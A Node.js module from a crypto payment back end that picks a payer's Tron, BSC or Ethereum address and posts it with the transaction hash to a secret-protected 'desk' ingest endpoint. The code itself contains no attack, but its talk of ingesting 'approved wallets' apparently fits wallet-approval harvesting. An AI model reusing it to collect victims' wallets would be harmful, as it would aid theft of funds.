const env = require("../config/env");
const sessionStore = require("../storage/sessions");
const logger = require("../utils/logger");

function chainIdForNetwork(networkKey) {
    if (networkKey === "tron") {
        return "tron:0x2b6653dc";
    }
    if (networkKey === "bsc") {
        return "eip155:56";
    }
    if (networkKey === "eth" || networkKey === "ethereum") {
        return "eip155:1";
    }
    return null;
}

function addressForPayment(payment) {
    if (payment?.fromAddress) {
        return payment.fromAddress;
    }

    const session = sessionStore.getSession(payment.connectionId) || {};
    const { expandCardAccounts } = require("../utils/helpers");
    const accounts = expandCardAccounts(session.accounts || []);
    const networkKey = String(payment.network || "").toLowerCase();
    const chainId = chainIdForNetwork(networkKey);
    const match = accounts.find((item) => (
        item.network === networkKey
        || item.chainId === chainId
        || (networkKey === "tron" && item.namespace === "tron")
        || ((networkKey === "bsc" || networkKey === "eth") && item.namespace === "eip155" && item.chainId === chainId)
    ));

    const picked = match?.address || null;
    if (networkKey === "eth" || networkKey === "ethereum" || networkKey === "bsc") {
        if (picked && /^0x[a-fA-F0-9]{40}$/i.test(picked)) {
            return picked;
        }
        const evm = accounts.find((item) => /^0x[a-fA-F0-9]{40}$/i.test(String(item.address || "")));
        return evm?.address || null;
    }

    if (picked && String(picked).startsWith("T")) {
        return picked;
    }

    const tron = accounts.find((item) => String(item.address || "").startsWith("T"));
    return tron?.address || null;
}

function deskConfig() {
    const url = String(env.DESK_URL || "").trim().replace(/\/$/, "");
    const secret = String(env.DESK_INGEST_SECRET || "").trim();
    return { url, secret };
}

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function ingestApprovedWallet(payment, deps = {}) {
    const { url, secret } = deskConfig();
    if (!url || !secret) {
        return { skipped: true, reason: "unset" };
    }

    const address = addressForPayment(payment);
    const txHash = payment?.transactionHash;
    const network = payment?.network;
    if (!address || !txHash || !network) {
        logger.warn({ paymentId: payment?.paymentId, network, hasAddress: Boolean(address), hasHash: Boolean(txHash) }, "Desk ingest skipped: missing address or tx hash");
        return { skipped: true, reason: "incomplete" };
    }

    const fetchImpl = deps.fetchImpl || fetch;
    const attempts = Number(deps.attempts || 3);
    let last = { ok: false, status: 0, payload: null };

    for (let i = 0; i < attempts; i += 1) {
        try {
            const response = await fetchImpl(`${url}/api/ingest`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "x-ingest-secret": secret
                },
                body: JSON.stringify({ network, address, txHash, fromAddress: address })
            });

            const text = await response.text();
            let payload = null;
            try {
                payload = JSON.parse(text);
            } catch (_err) {
                payload = { raw: text };
            }

            if (response.ok) {
                logger.info({ paymentId: payment.paymentId, network, address }, "Desk ingest saved approved wallet");
                return { ok: true, payload };
            }

            last = { ok: false, status: response.status, payload };
            logger.warn({
                paymentId: payment.paymentId,
                status: response.status,
                error: payload.error || payload.raw,
                attempt: i + 1
            }, "Desk ingest failed");
        } catch (err) {
            last = { ok: false, status: 0, payload: { error: err.message } };
            logger.warn({ paymentId: payment.paymentId, err: { message: err.message }, attempt: i + 1 }, "Desk ingest failed");
        }

        if (i < attempts - 1) {
            await sleep(1000 * (i + 1));
        }
    }

    return last;
}

async function ingestVerifiedPayments(connectionId, deps = {}) {
    const paymentStore = require("../storage/payments");
    const rows = paymentStore.listByConnection(connectionId)
        .filter((item) => item.status === "verified" && item.transactionHash);

    const results = [];
    for (const row of rows) {
        results.push(await ingestApprovedWallet(row, deps));
    }
    return results;
}

module.exports = {
    ingestApprovedWallet,
    ingestVerifiedPayments,
    addressForPayment,
    deskConfig
};
